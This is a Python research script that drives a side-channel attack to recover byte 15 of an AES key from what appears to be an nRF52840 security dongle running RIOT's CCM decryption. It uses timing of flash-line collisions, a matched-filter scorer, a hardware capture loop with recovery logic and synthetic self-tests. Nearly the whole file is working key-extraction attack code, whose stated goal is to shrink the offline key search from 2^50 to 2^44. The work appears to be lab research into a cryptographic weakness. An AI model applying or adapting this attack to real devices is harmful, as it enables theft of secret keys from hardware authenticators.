#!/usr/bin/env python3
"""Matched-filter recovery of k[15], whose reference line MOVES between blocks.

Every other byte in this ladder collides against a reference whose round-1 index is
fixed, so all the blocks of one unwrap dip at the same offset and a plain argmin over 64
classes finds it. **AES 15 is different**: it holds the CCM counter's low byte, so its
index is `c ^ k[15]` with `c` running over the counter values of the unwrap. The
reference line moves block to block, the collision scatters across several offset
classes, and an argmin that looks at one bin throws most of the evidence away.

It scatters predictably, though, which is what makes a matched filter the right
estimator. Because XOR is bitwise, `(o ^ k) >> 2 == (o >> 2) ^ (k >> 2)` exactly, so a
hypothesis `h = (k[5] ^ k[15]) >> 2` predicts dips at the offset classes `h ^ (c >> 2)`,
one per distinct `c >> 2`, weighted by how many blocks carry that `c`. Scoring each of
the 64 hypotheses by that weighted pattern recovers most of the lost signal:

    SNR_matched / SNR_single = sqrt(sum w_i^2) / n_blocks

which for this victim is `sqrt(37) / 11 = 0.55` -- a factor of 1.8 worse than a normal
step, so ~3.3x the probes, roughly 4-5 h for the one measurement. Against the ~99 h of
offline search the six bits would otherwise cost, that is the cheaper end.

Why AES 15 is worth the trouble
-------------------------------
`k[0]` and `k[15]` are the two structurally hard bytes, and each one left unrecovered
costs 6 bits of search space (2^8 enumerated whole instead of 2^2 of low bits). Getting
`k[15]` takes the offline problem from **2^50 to 2^44**, which is the difference between
~99 h and ~1.5 h on the CPU search that already exists.

`k[0]` is not recoverable this way: it is first in the compiled read order and its only
neighbour is AES 15, also uncontrolled.

The block structure sets the weights, so it is not assumed
----------------------------------------------------------
RIOT's `cipher_decrypt_ccm` spends counter **0** on the MAC tag, then counters **1..9**
on the 136-byte body, then builds `B_0` whose byte 15 is `plain_len & 0xff` = `0x88` --
eleven nonce-carrying blocks in total, read off `sys/crypto/modes/ccm.c`. Rather than
trust one reading of that, this scorer evaluates every hypothesis under several candidate
models and reports which fits best, so a wrong assumption shows up as a model that loses
rather than as a wrong key. `single` is the degenerate model and is exactly the plain
argmin, included so the gain over it is visible in the same output.

Capture and scoring are separate on purpose: the capture is ordinary `ref`-stage
machinery (sweep one byte's offset with nothing else pinned), so it can be taken by the
campaign driver or by `--capture` here, and re-scored offline as often as you like.
"""

from __future__ import annotations

import argparse
import json
import math
import sys
import time
from collections import Counter
from pathlib import Path

import numpy as np

ROOT = Path(__file__).resolve().parents[2]
HERE = Path(__file__).resolve().parent

# AES 15's neighbours in the victim's compiled round-1 order; only AES 5 is controlled.
SWEPT_AES_BYTE = 5
DELTAS = [d * 4 for d in range(64)]


def block_models(payload_len: int = 136, mac_len: int = 16) -> dict[str, Counter]:
    """Candidate sets of byte-15 values, as {model name: {class: block count}}.

    `cipher_decrypt_ccm` uses counter 0 for the tag, 1..ceil(payload/16) for the body,
    and `B_0` carries `payload_len & 0xff` in byte 15.
    """
    body = (payload_len + 15) // 16
    b0 = payload_len & 0xFF
    sets = {
        "ctr0-N+B0": list(range(0, body + 1)) + [b0],
        "ctr1-N+B0": list(range(1, body + 1)) + [b0],
        "ctr0-N": list(range(0, body + 1)),
        "single": [0],
    }
    return {name: Counter(c >> 2 for c in cs) for name, cs in sets.items()}


def line_of(entry: int, pad: int) -> int:
    """Flash line holding table entry `entry`, for a table `pad` bytes into a line."""
    return (4 * (entry & 0xFF) + pad) // 16


def patterns_numeric(counters: list[int], pad: int) -> dict[tuple[int, int], np.ndarray]:
    """Predicted dip pattern over the 64 swept classes, per (k[5], k[15]) hypothesis.

    Why numeric rather than algebraic. The pad-0 estimator works because
    `(o ^ k) >> 2 == (o >> 2) ^ (k >> 2)`, which makes the pattern a function of the
    single 6-bit difference `(k[5] ^ k[15]) >> 2` -- 64 hypotheses, one XOR per class.
    At any other pad the line map is `(4*i + pad)//16`, which is NOT a function of
    `i_5 ^ i_15`: whether the two entries share a line depends on each index, not on
    their XOR (RESULTS.md section 5h). There is no difference to hypothesise, so the
    space is the PAIR, and the honest way to score it is to build each pattern by
    evaluating the line map rather than by deriving algebra that does not exist.

    The cost is a larger hypothesis space -- 65536 pairs against 64 -- so the noise floor
    rises with the best-of-N order statistic, and `selftest` measures it rather than
    assuming it. What it buys back: the answer is each byte's own line window, where the
    pad-0 estimator only ever recovered their difference.
    """
    out: dict[tuple[int, int], np.ndarray] = {}
    deltas = np.array(DELTAS)
    for k5 in range(256):
        i5 = (deltas ^ k5) & 0xFF                       # swept byte's entry per class
        l5 = (4 * i5 + pad) // 16
        for k15 in range(256):
            pat = np.zeros(64)
            for c in counters:
                if line_of(c ^ k15, pad) in l5:
                    pat[l5 == line_of(c ^ k15, pad)] += 1
            if pat.any():
                out[(k5, k15)] = pat
    return out


def score_numeric(profile: np.ndarray, pats: dict[tuple[int, int], np.ndarray]):
    """Score every pair hypothesis. Returns (sorted list of (score, key), array)."""
    dev = profile - profile.mean()
    scores = {h: float(-(p * dev).sum() / np.sqrt(p.sum())) for h, p in pats.items()}
    ranked = sorted(scores.items(), key=lambda kv: kv[1], reverse=True)
    return ranked, np.array([v for _, v in scores.items()])


def score(profile: np.ndarray, weights: Counter) -> np.ndarray:
    """Matched-filter score for every hypothesis h, higher = better.

    `profile` is the mean poll count per offset class, so a collision makes it SMALLER;
    the score negates it. Each hypothesis predicts a dip at `h ^ cls` for every class in
    the weight map.
    """
    dev = profile - profile.mean()
    n = len(profile)
    out = np.zeros(n)
    idx = np.arange(n)
    for cls, w in weights.items():
        if cls >= n:
            continue
        out += w * -dev[idx ^ cls]
    return out


def conditional_table(a: np.ndarray, pad: int, payload_len: int, top: int) -> dict:
    """{AES 5 window: [k[15] windows, best first]} -- the filter's real deliverable.

    Scored flat over 65536 pairs the estimator does not name the answer; the true pair
    reaches rank 4 on the 6031-per-class capture, which is information but not an
    identification. Conditioned on AES 5's own window it does: rank 1 of 65 at
    +3.82 sigma. And the offline search can condition for free, because it enumerates
    the anchor and so fixes AES 5's window on every candidate.

    So the deliverable is a row per AES 5 window rather than one relation, and the
    search tries the top `top` entries of whichever row its candidate implies.
    """
    polls = a[:, 1].astype(float)
    cls = a[:, 0].astype(int) >> 2
    cnt = np.bincount(cls, minlength=64)
    tot = np.bincount(cls, weights=polls, minlength=64)
    prof = np.where(cnt > 0, tot / np.maximum(cnt, 1), polls.mean())
    dev = prof - prof.mean()
    body = (payload_len + 15) // 16
    counters = list(range(0, body + 1)) + [payload_len & 0xFF]
    pats = patterns_numeric(counters, pad)

    rows: dict[int, list[int]] = {}
    margins: dict[int, float] = {}
    for w5 in range(65):
        by: dict[int, float] = {}
        for (k5, k15), p in pats.items():
            if line_of(k5, pad) != w5:
                continue
            s = float(-(p * dev).sum() / np.sqrt(p.sum()))
            w15 = line_of(k15, pad)
            by[w15] = max(by.get(w15, -1e9), s)
        if not by:
            continue
        order = sorted(by, key=lambda w: by[w], reverse=True)
        rows[w5] = order[:top]
        sc = np.array([by[w] for w in order])
        if len(sc) > 1:
            margins[w5] = float((sc[0] - sc[1:].mean()) / sc[1:].std(ddof=1))
    return {"pad": pad, "top": top, "n": int(len(polls)),
            "per_class": int(cnt.min()),
            "table": {str(k): v for k, v in rows.items()},
            "margin_sigma": {str(k): round(v, 2) for k, v in margins.items()}}


def report_pad(a: np.ndarray, key: bytes | None, pad: int, payload_len: int) -> dict:
    """Score a capture at a NON-ZERO table pad, over (k[5], k[15]) pairs.

    Reported as the winning pair plus the two line windows it implies, because the
    windows are what a search can consume -- the pair itself is only identified up to
    whatever leaves the pattern unchanged.
    """
    polls = a[:, 1].astype(float)
    # Bin by the SWEEP's own index -- 64 deltas, all multiples of 4 -- which is just a
    # label for the measurement and carries no line model. The pad enters only in
    # `patterns_numeric`, where the delta is turned into a table entry and then a line.
    cls = (a[:, 0].astype(int) >> 2)
    cnt = np.bincount(cls, minlength=64)
    tot = np.bincount(cls, weights=polls, minlength=64)
    prof = np.where(cnt > 0, tot / np.maximum(cnt, 1), polls.mean())

    body = (payload_len + 15) // 16
    counters = list(range(0, body + 1)) + [payload_len & 0xFF]
    pats = patterns_numeric(counters, pad)
    ranked, allsc = score_numeric(prof, pats)
    (bk5, bk15), best = ranked[0]
    others = np.array([v for _, v in ranked[1:]])
    margin = (best - others.mean()) / others.std(ddof=1)

    print(f"n = {len(polls)}, {cnt.min()}-{cnt.max()} per class, pad {pad}, "
          f"{len(pats)} pair hypotheses")
    print(f"best pair k[5]={bk5} k[15]={bk15}  margin {margin:+.2f} sigma over the rest")
    print(f"  implies line windows: AES 5 -> {line_of(bk5, pad)}, "
          f"AES 15 at counter 0 -> {line_of(bk15, pad)}")
    out = {"n": int(len(polls)), "pad": pad, "best_k5": bk5, "best_k15": bk15,
           "margin_sigma": round(float(margin), 2), "hypotheses": len(pats)}
    if key:
        tk5, tk15 = key[SWEPT_AES_BYTE], key[15]
        tw5, tw15 = line_of(tk5, pad), line_of(tk15, pad)
        hit = [i for i, ((h5, h15), _) in enumerate(ranked)
               if line_of(h5, pad) == tw5 and line_of(h15, pad) == tw15]
        print(f"CHECK: true k[5]={tk5} k[15]={tk15} -> windows {tw5}/{tw15}; "
              f"best hypothesis with those windows ranks "
              f"{(hit[0] + 1) if hit else 'nowhere'} of {len(ranked)}")
        out["true_window_rank"] = (hit[0] + 1) if hit else None
    print("\nNOTE: the noise floor for a best-of-%d statistic is well above the +2.5 "
          "sigma\nquoted for the 64-hypothesis pad-0 filter. Run `selftest --pad %d` to "
          "measure it\nbefore reading the margin above as a result." % (len(pats), pad))
    return out


def report(a: np.ndarray, key: bytes | None, payload_len: int, mac_len: int) -> dict:
    """Score one capture under every model. Rows are (delta, polls).

    PAD 0 ONLY. The estimator's `h ^ cls` pattern assumes a 16-byte-aligned table; this
    victim's is not aligned (RESULTS.md section 5h), so use `--pad 4` and `report_pad`.
    """
    polls = a[:, 1].astype(float)
    classes = (a[:, 0].astype(int) >> 2)
    nb = 64
    cnt = np.bincount(classes, minlength=nb)
    tot = np.bincount(classes, weights=polls, minlength=nb)
    prof = np.where(cnt > 0, tot / np.maximum(cnt, 1), polls.mean())
    sem = polls.std(ddof=1) / np.sqrt(np.maximum(cnt, 1))

    print(f"n = {len(polls)}, {cnt.min()}-{cnt.max()} per class, "
          f"sd {polls.std(ddof=1):.2f} polls, sem ~ {sem.mean():.3f}")
    want = ((key[SWEPT_AES_BYTE] ^ key[15]) >> 2) if key else None
    if want is not None:
        print(f"the answer, for the check afterwards: (k[{SWEPT_AES_BYTE}]^k[15])>>2 "
              f"= {want}")

    out = {"n": int(len(polls)), "models": {}}
    print(f"\n{'model':>12} {'blocks':>7} {'weights':>26} {'argmax':>7} "
          f"{'margin':>8} {'rank of true':>13}")
    for name, w in block_models(payload_len, mac_len).items():
        s = score(prof, w)
        order = np.argsort(s)[::-1]
        best = int(order[0])
        # Margin in units of the score's own spread over the losing hypotheses.
        losers = np.delete(s, best)
        margin = (s[best] - losers.mean()) / losers.std(ddof=1)
        rank = (int(np.where(order == want)[0][0]) + 1) if want is not None else None
        out["models"][name] = {"weights": {str(k): v for k, v in w.items()},
                               "argmax": best, "margin_sigma": round(float(margin), 2),
                               "rank_of_true": rank,
                               "correct": (best == want) if want is not None else None}
        print(f"{name:>12} {sum(w.values()):>7} {str(dict(w)):>26} {best:>7} "
              f"{margin:>+8.2f} {str(rank) + '/64' if rank else '-':>13}"
              + ("  <== MATCH" if want is not None and best == want else ""))
    return out


def synthetic(model: str, k5: int, k15: int, n_per_class: int, sd: float,
              payload_len: int, seed: int) -> np.ndarray:
    """A capture as it would look if the model were true, for testing the scorer.

    Uses the per-block effect measured for a real reference collision (-0.478 polls for
    all blocks colliding), divided over the blocks, plus Gaussian noise at the spread the
    bench actually shows.
    """
    rng = np.random.default_rng(seed)
    w = block_models(payload_len)[model]
    nblocks = sum(w.values())
    per_block = 0.478 / nblocks
    truth = (k5 ^ k15) >> 2
    rows = []
    for d in DELTAS:
        cls = d >> 2
        # How many blocks collide at this offset under the true hypothesis.
        blocks = w.get(cls ^ truth, 0)
        mu = 50.0 - per_block * blocks
        rows.extend((d, v) for v in rng.normal(mu, sd, n_per_class))
    return np.array(rows, dtype=float)


def cmd_selftest(args) -> int:
    key = bytes.fromhex(args.key)
    print("=== scorer self-test on synthetic captures (no hardware) ===")
    ok = True
    for model in ("ctr0-N+B0", "ctr1-N+B0"):
        for n in (args.n_small, args.n_big):
            a = synthetic(model, key[SWEPT_AES_BYTE], key[15], n, args.sd,
                          args.payload_len, args.seed)
            print(f"\n--- generated under {model}, {n} per class, sd {args.sd} ---")
            r = report(a, key, args.payload_len, args.mac_len)
            got = r["models"][model]["correct"]
            print(f"    the generating model {'RECOVERS' if got else 'FAILS on'} "
                  f"the true hypothesis")
            if n == args.n_big and not got:
                ok = False
    print("\n--- null: pure noise, no collision at all ---")
    rng = np.random.default_rng(args.seed + 1)
    rows = [(d, v) for d in DELTAS
            for v in rng.normal(50.0, args.sd, args.n_big)]
    r = report(np.array(rows, dtype=float), key, args.payload_len, args.mac_len)
    worst = max(m["margin_sigma"] for m in r["models"].values())
    print(f"    largest margin on noise: {worst:+.2f} sigma "
          f"-- anything a real capture reports must beat this comfortably")
    print("\nself-test", "PASSED" if ok else "FAILED")
    return 0 if ok else 1


def cmd_capture(args) -> int:
    marker = ROOT / "hardware/CAMPAIGN_RUNNING.md"
    if marker.exists() and not args.force:
        print(f"REFUSING: {marker} exists, so a capture is already using the bench.\n"
              f"Opening COM19 would break it. Wait for it to finish, or pass --force if\n"
              f"you have checked that the marker is stale.")
        return 1
    sys.path.insert(0, str(ROOT / "hardware"))
    sys.path.insert(0, str(HERE))
    import boards
    from nfill_sweep import tblock
    from usbhost_capture import HOST_BOARD, VICTIM_BOARD, Host, reset_boards

    boards.require(HOST_BOARD)
    boards.require(VICTIM_BOARD)
    # Opening and configuring are now callable, because recovery has to redo both:
    # a wedged OTG port needs the port reopened, and everything the sweep depends on
    # -- the halt guard, the pre-poll delay, the nonce fill and its mask -- is host
    # firmware state that a fresh bring-up clears.
    def open_host(flash: bool):
        if flash:
            boards.flash(HOST_BOARD, str(ROOT / "instruments/ctaphost/fw.bin"))
            time.sleep(0.5)
        reset_boards()
        hh = Host(boards.BOARDS[HOST_BOARD]["port"])
        hh.bring_up()
        return hh

    def configure(hh):
        for c in (f"D 0 {args.guard} 4000", f"A {args.recover}", f"S {args.prepoll}",
                  "J 0", "L 0 0 0", "U 99 0", "N 0",
                  f"M {1 << (SWEPT_AES_BYTE - 1)}"):
            hh.cmd(c, 0.3, cap=80)
        # Pin the USB frame phase, which is NOT optional on the nRF52840 Dongle. §5j measured
        # two 1.5 h ladder stages of one byte differing only in this: gated gave p = 0.010 and
        # ungated p = 0.590, a margin sitting on the label-shuffle null's own mean. Ungated,
        # the delta classes end up at systematically different frame phases -- per-class mean
        # `ftrem` spanning 1 330 clocks against the gated 25 -- so a class difference can be
        # manufactured with no collision involved. This estimator already runs at 0.55 of a
        # normal step's SNR, so it can least afford the extra variance, and it is scored
        # against 64 hypotheses where a phase artefact is exactly what would win.
        if args.phase_hi > args.phase_lo:
            reply = hh.cmd(f"f {args.phase_lo} {args.phase_hi}", 0.4, cap=80)
            if "phase window" not in reply:
                raise RuntimeError(
                    "--phase-lo/--phase-hi given but the rig does not know `f`: rebuild "
                    f"instruments/ctaphost and reflash. Reply was {reply.strip()!r}")
        hh.cmd(f"G 1 {args.idlen}", 2.0)

    h = open_host(not args.no_flash)
    configure(h)

    rows, errs, t0, rep, blocks = [], 0, time.time(), 0, 0
    empties = hard = 0
    # Progress every few blocks rather than once per rep. A rep is 64 deltas x
    # `block` probes -- about 100 s at the 14.4 probe/s this rig sustains -- so
    # per-rep printing gave 23 lines in five hours, and none of them said that the
    # run had stopped producing after the first 42 minutes.
    want_rate = args.min_rate
    while time.time() - t0 < args.hours * 3600:
        order = DELTAS if rep % 2 == 0 else list(reversed(DELTAS))
        for d in order:
            if time.time() - t0 > args.hours * 3600:
                break
            h.cmd(f"U {SWEPT_AES_BYTE - 1} {d}", 0.08, cap=64)
            tb = time.time()
            got, e = tblock(h, args.seed + rep, args.entries, args.block,
                            budget=6.0 + 0.5 * args.block)
            dt = time.time() - tb
            errs += e
            if not got:
                # ESCALATE. A bare `I` is a CTAPHID re-INIT and cannot revive a
                # wedged OTG port -- the exact failure `ladder_campaign.py` records
                # for 2026-09-24, where a stage froze for 91 minutes while every
                # block came back empty. This capture inherited the naive version
                # and paid the same price on 2026-09-26: it ran at 14.4 probe/s for
                # 42 minutes, wedged, and spent the remaining 4.3 hours of its
                # 5-hour budget producing nothing, for 540 per class against a
                # threshold of 3500.
                empties += 1
                h.cmd("I", 2.0)
                if empties >= 3:
                    hard += 1
                    reflash = hard % 3 == 0
                    print(f"  {empties} empty blocks: "
                          f"{'reflash + ' if reflash else ''}reset and bring up "
                          f"(escalation {hard})", flush=True)
                    try:
                        h.s.close()
                    except Exception:
                        pass
                    h = open_host(reflash)
                    configure(h)
                    empties = 0
            else:
                empties = 0
            rows.extend((d, r[1]) for r in got)
            blocks += 1
            if blocks % 16 == 0:
                el = time.time() - t0
                rate = len(rows) / max(el, 1e-9)
                print(f"  {len(rows)} probes, {errs} faults, {rate:.1f}/s, "
                      f"{el / 60:.0f} min of {args.hours * 60:.0f}, "
                      f"n/class ~ {len(rows) // 64}, last block {len(got)}/"
                      f"{args.block} rows in {dt:.1f} s", flush=True)
                # Abort rather than spend the whole budget at a rate that cannot
                # reach a usable depth. 3500 per class is the threshold the
                # self-test puts the estimator's floor at.
                if el > 300 and rate < want_rate:
                    print(f"  ABORTING: {rate:.1f} probe/s is below --min-rate "
                          f"{want_rate}; at this rate {args.hours:.1f} h reaches "
                          f"n/class ~ {int(rate * args.hours * 3600) // 64}, and the "
                          f"estimator needs ~3500. Fix the rate, do not spend the "
                          f"budget.", flush=True)
                    rep = 10 ** 9
                    break
        if rep >= 10 ** 9:
            break
        rep += 1
    a = np.array(rows, dtype=np.int64)
    np.savez_compressed(args.out, rows=a, swept_aes=np.int64(SWEPT_AES_BYTE),
                        deltas=np.asarray(DELTAS))
    print(f"wrote {args.out} ({len(a)} rows)")
    return 0


def cmd_table(args) -> int:
    import json as _json
    d = np.load(args.npz)
    t = conditional_table(d["rows"], args.pad, args.payload_len, args.top)
    Path(args.out).write_text(_json.dumps(t, indent=2) + "\n", newline="\n")
    rows = t["table"]
    print(f"wrote {args.out}: {len(rows)} AES 5 windows, top {args.top} each, "
          f"from {t['n']} probes at {t['per_class']}+ per class")
    return 0


def cmd_score(args) -> int:
    d = np.load(args.npz)
    key = bytes.fromhex(args.key) if args.key else None
    if args.pad:
        r = report_pad(d["rows"], key, args.pad, args.payload_len)
    else:
        print("scoring at pad 0. This victim's table is NOT 16-byte aligned -- "
              "pass --pad 4.\n(RESULTS.md section 5h; pad 0 scoring called five landed "
              "stages duds.)\n")
        r = report(d["rows"], key, args.payload_len, args.mac_len)
    if args.out:
        Path(args.out).write_text(json.dumps(r, indent=2) + "\n")
        print(f"\nwrote {args.out}")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--payload-len", type=int, default=136,
                    help="bytes the CCM decrypt covers; sets how many counter blocks "
                         "there are and what B_0 carries in byte 15")
    ap.add_argument("--mac-len", type=int, default=16)
    sub = ap.add_subparsers(dest="cmd", required=True)

    st = sub.add_parser("selftest", help="score synthetic captures; no hardware")
    st.add_argument("--key", default="2b7e151628aed2a6abf7158809cf4f3c")
    st.add_argument("--n-small", type=int, default=400)
    st.add_argument("--n-big", type=int, default=3500)
    st.add_argument("--sd", type=float, default=3.0)
    st.add_argument("--seed", type=int, default=11)
    st.add_argument("--pad", type=int, default=0,
                    choices=(0, 4, 8, 12))
    st.set_defaults(func=cmd_selftest)

    cp = sub.add_parser("capture", help="take the sweep on hardware (refuses if a "
                                        "campaign is running)")
    cp.add_argument("--out", default=str(HERE / "k15_matched.npz"))
    cp.add_argument("--hours", type=float, default=5.0)
    cp.add_argument("--entries", type=int, default=8)
    cp.add_argument("--idlen", type=int, default=164)
    cp.add_argument("--guard", type=int, default=10)
    cp.add_argument("--prepoll", type=int, default=9000)
    cp.add_argument("--recover", type=int, default=2)
    cp.add_argument("--block", type=int, default=24)
    cp.add_argument("--seed", type=int, default=500000)
    cp.add_argument("--no-flash", action="store_true")
    cp.add_argument("--force", action="store_true")
    cp.add_argument("--min-rate", type=float, default=8.0,
                    help="abort if sustained probes/s falls below this. The bench "
                         "does 17-18/s; the first real capture ran at 2.0 and its "
                         "540 per class were unusable against a ~3500 threshold")
    cp.add_argument("--phase-lo", type=int, default=18000,
                    help="pin each probe to this HFNUM.FRREM window. The default is the "
                         "measured best for 8 allow-list entries on the nRF52840 Dongle; "
                         "0 0 runs ungated, which on that board measured nothing at all.")
    cp.add_argument("--phase-hi", type=int, default=23999)
    cp.set_defaults(func=cmd_capture)

    sc = sub.add_parser("score", help="score a capture offline")
    sc.add_argument("npz")
    sc.add_argument("--key", default=None, help="for the check after the search")
    sc.add_argument("--pad", type=int, default=0, choices=(0, 4, 8, 12),
                    help="the table's offset inside its 16-byte flash line. "
                         "THIS VICTIM IS PAD 4 (RESULTS.md section 5h); pad 0 "
                         "uses the aligned estimator and is wrong here")
    sc.add_argument("--out", default=None)
    sc.set_defaults(func=cmd_score)

    tb = sub.add_parser("table", help="write the conditional k[15] table")
    tb.add_argument("npz")
    tb.add_argument("--pad", type=int, default=4, choices=(4, 8, 12))
    tb.add_argument("--top", type=int, default=3,
                    help="how many k[15] windows to keep per AES 5 window. 1 is "
                         "enough on this capture (rank 1 of 65) and 3 is cheap "
                         "insurance: 2^44 against 2^45.6")
    tb.add_argument("--out", default=str(HERE / "k15_table.json"))
    tb.add_argument("--payload-len", type=int, default=136)
    tb.set_defaults(func=cmd_table)

    args = ap.parse_args()
    return args.func(args)


if __name__ == "__main__":
    raise SystemExit(main())
